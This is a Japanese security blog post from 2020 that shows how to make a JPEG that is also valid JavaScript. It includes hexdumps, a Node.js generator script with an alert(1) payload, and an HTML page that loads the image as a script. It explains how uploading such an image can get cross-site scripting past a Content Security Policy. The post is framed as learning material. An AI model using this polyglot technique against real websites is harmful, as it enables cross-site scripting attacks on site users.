---
title: JPEG画像にJavaScriptのコードを埋め込んでみる
date: 2020-02-14
description: JPEG画像にJavaScriptのコードを埋め込んでみる
tags: ['セキュリティ']
---
JPEG画像にJavaScriptのコードを埋め込む手法が紹介されていたので試してみました。  
今回は次の画像に対してコードの埋め込んでみます。

![埋め込み画像](donarudo.jpg)

## 注意

この記事は攻撃方法を知ることでセキュリティを学ぶことを前提としており、実験も仮想環境上で実行しています。  
決して外部サイトに対して実行しないようにしてください。

## 画像のバイナリを見てみる

今回試す方法は画像のバイナリを変更してコードを埋め込んでいます。  
そこで、最初は画像のバイナリを確認してみます。

```shell
$ hexdump -C donarudo.jpg | head -n 5
00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 00 00 01  |......JFIF......|
00000010  00 01 00 00 ff e1 00 6c  45 78 69 66 00 00 49 49  |.......lExif..II|
00000020  2a 00 08 00 00 00 03 00  31 01 02 00 07 00 00 00  |*.......1.......|
00000030  32 00 00 00 12 02 03 00  02 00 00 00 02 00 02 00  |2...............|
00000040  69 87 04 00 01 00 00 00  3a 00 00 00 00 00 00 00  |i.......:.......|

$ hexdump -C donarudo.jpg | tail -n 3
000038f0  99 e8 80 e7 8a 5a 68 a7  57 de a3 e7 02 8a 28 a6  |.....Zh.W.....(.|
00003900  01 45 14 50 01 45 14 50  07 ff d9                 |.E.P.E.P...|
0000390b
```

先頭の2バイト **FF D8** はSOIマーカーと呼ばれ、JPEGフォーマットの開始を表しています。  
次の2バイト **FF E0** はセグメントの種類を表しており、次の2バイトの **00 10** がセグメントの長さを示していて
10進数で 16 なので、**00 10** を含む16バイト分（**FF E1** の手前まで) がセグメントであるのが分かります。  
最後の **FF D9** はEOIマーカーと呼ばれ、JPEGフォーマットの終了を表しています。

今回はこのセグメント内に `alert(1)` のjsコードを埋め込んでいきます。16進数のバイナリ表現は次のように取得できます。

```javascript
$ node
> 'alert(1);'.split('').map(i => i.charCodeAt(0).toString(16)).join('')
'616c6572742831293b'
```

## jsコードを埋め込む

↓がバイナリを変更して、jsコードを埋め込んでみた様子です。  

```shell
$ hexdump -C donarudo_01.jpg | head -n 5
00000000  ff d8 ff e0 00 10 4a 46  49 46 00 61 6c 65 72 74  |......JFIF.alert|
00000010  28 31 29 00 ff e1 00 6c  45 78 69 66 00 00 49 49  |(1)....lExif..II|
00000020  2a 00 08 00 00 00 03 00  31 01 02 00 07 00 00 00  |*.......1.......|
00000030  32 00 00 00 12 02 03 00  02 00 00 00 02 00 02 00  |2...............|
00000040  69 87 04 00 01 00 00 00  3a 00 00 00 00 00 00 00  |i.......:.......|
```

このままjsのコードとして読み込んでも、無効な文字列を含んでおりjsの読み込みでエラーが発生します。  
jsは `/*....*/` で囲む事でコメントとしてコードを無視することが出来るので、それを利用して画像データの部分をコメントアウトして、jsとして有効なコードであるように偽装する事が可能です。

```shell
$ hexdump -C bad-donarudo.jpg | head -n 6
00000000  ff d8 ff e0 2f 2a 4a 46  49 46 00 01 01 00 00 01  |..../*JFIF......|
00000010  00 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00002f20  2a 2f 3d 61 6c 65 72 74  28 31 29 3b 2f 2a ff e1  |*/=alert(1);/*..|
00002f30  00 6c 45 78 69 66 00 00  49 49 2a 00 08 00 00 00  |.lExif..II*.....|

$ hexdump -C bad-donarudo.jpg | tail -n 3
00006810  68 a7 57 de a3 e7 02 8a  28 a6 01 45 14 50 01 45  |h.W.....(..E.P.E|
00006820  14 50 07 ff d9 2a 2f ff  d9                       |.P...*/..|
00006829
```

実際にコメントアウトの対応をしてjsコードを埋め込んだ画像のバイナリがこんな感じです。

先頭の4バイト **FF D8 FF E0** は有効な非ASCII文字のJavaScript変数になります。次の **2F 2A** がセグメントの始まりで、セグメントの部分を `/*.../*` でコメントアウトしています。 次に、`=` を差し込み変数代入とすることで、先頭の4バイトを変数として扱い有効な文字列としています。続いて `alert(1);` を実行コードとして差し込んでいます。その後、`/*...*/` で残りのJEPG画像データの部分をコメントアウトしています。

また、セグメント開始の **2F 2A** はセグメント長を表現しており、10進数で 12074 なので、セグメント長を合わせるために、12074 - 16 - 14 = 12044バイト をヌルバイト（**00**）で埋めています。

本来のセグメント部分:  
`2F 2A 4A 46 49 46 00 01 01 00 00 01 00 00 00 10 00 01` の16バイト  

埋め込みjsコード部分:  
`*/alert(1);/*` => `2a2f3d616c6572742831293b2f2a` 14バイト

有効なjsコードの部分だけを表現すると次のようになります。

```js
<有効な非アスキー文字>=alert(1);
```

このjsコードの埋め込みは次のプログラムで実現できます。

```js
const fs = require('fs');

const image = fs.readFileSync('donarudo.jpg');
const hex = image.toString('hex');
const soi = hex.substr(0,8);
const commentStart = '2f2a'; // /*
const header = hex.substr(12,28);
const nullBytes = Array(12044).fill('00').join('');
const code = `*/=alert(1);/*`.split('').map(e => e.charCodeAt(0).toString(16)).join('');
const payload = hex.substr(40, hex.length - 4);
const commentEnd = '2a2f'; // */
const eoi = hex.substr(hex.length - 4);
const injectedJsJpeg = soi + commentStart + header + nullBytes + code + payload + commentEnd + eoi;
const hexBinary = new Buffer(injectedJsJpeg, 'hex');

fs.writeFileSync('bad-donarudo.jpg', hexBinary);
```

## JPEG画像を読み込んでみる

jsを埋め込んだ画像を読み込んでみます。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>
    <img src="bad-donarudo.jpg"/>
    <script src="bad-donarudo.jpg"></script>
</body>
</html>
```

![JavaScriptを埋め込んだ画像](donarudo-xss.png)

正常に画像は表示されて、jsファイルとしても読み込む事ができました！  
Chromeでは対策済みでアラートが表示されず、IE11でアラートの表示が確認できました。

実現可能なブラウザは限られますが、日本国内ではまだまだIE11の利用ユーザーは多いので無視できない手法です。

## 攻撃の使われ方

これで簡単にXSSが出来るのかなと思ったのですが、<img>タグで読み込んだ場合はあくまで画像として処理されるので、コードが実行されることはありません。  
あくまで、攻撃対象のサイト上で \<script>タグで画像を読み込ませる必要があります。  

ではこの手法がどのような攻撃に利用されるかというと、**[コンテンツセキュリティポリシー（CSP）](https://developer.mozilla.org/ja/docs/Web/HTTP/CSP)のバイパス** に利用されます。  
CSPが有効になっているWebサイトでは別ドメインからのjsファイルの読み込みやインラインスクリプトの実行がブロックされます。そのため、\<script>タグを埋め込む事ができてもXSSを防ぐ事が可能になります。

しかし、Webサイトに画像アップロードが機能があった場合に、jsコードを埋め込んだ画像をアップロードして、その画像を読み込むように\<script>タグを埋め込むめば、CSPのセキュリティをくぐり抜けてxssを実現することが可能になります。

```html
<!-- Webサーバーに配置されている自分がアップロードしたjsコードを埋め込んだJPEG画像 -->
<script src="/public/images/xss.jpg"></script>
```


最近はS3などにアップロードした画像が配置されるパターンが多く、その場合は画像読み込みがCSPのポリシー対象である外部ドメインとなるので、利用できる状況はかなり限定的なのかな？と思います。

## 参考文献
* [Hiding JavaScript in Picture Files for XSS](https://www.youtube.com/watch?v=memPcI94YGA)
* [Hiding JS in a JPEG header.](https://medium.com/@codedbrain/hiding-js-in-a-jpeg-header-454386f9e20)
* [Bypassing CSP using polyglot JPEGs](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs)
* [Content Security Policyについて語る](http://www.nowhere.co.jp/blog/archives/20190315-080010.html)
* [JPEGファイルの構造](https://hp.vector.co.jp/authors/VA032610/JPEGFormat/StructureOfJPEG.htm)
